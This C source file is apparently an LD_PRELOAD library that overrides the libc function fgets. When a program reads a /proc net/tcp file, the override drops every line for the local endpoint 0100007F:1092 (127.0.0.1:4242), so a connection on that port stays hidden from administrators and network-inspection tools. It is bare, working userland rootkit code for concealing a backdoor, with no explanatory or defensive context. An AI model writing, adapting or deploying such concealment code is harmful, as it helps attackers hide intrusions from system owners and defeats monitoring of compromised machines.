#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
static int get_file_name(FILE *f,char*buf,size_t size){int fd;char tmp[64];ssize_t ret;fd=fileno(f);if(fd<0)return 0;snprintf(tmp,sizeof(tmp),"/proc/self/fd/%d",fd);ret=readlink(tmp,buf,size);if(ret<0)return 0;buf[ret]=0;return 1;}
#define DECLARE_FGETS() static char*(*original_##fgets)(char*s,int size,FILE*stream)=NULL;char*fgets(char*s,int size,FILE*stream){if(original_##fgets==NULL){original_##fgets=dlsym(RTLD_NEXT,"fgets");if(original_##fgets==NULL){fprintf(stderr,"Error in dlsym: %s\n",dlerror());return NULL;}}char*ret;while(1){ret=original_##fgets(s,size,stream);if(ret){char	file_name[256];if(get_file_name(stream,file_name,256)&&strstr(file_name,"/proc/")&&strstr(file_name,"/net/tcp")&&strstr(ret," 0100007F:1092 "))continue;}break;}return ret;}
DECLARE_FGETS();
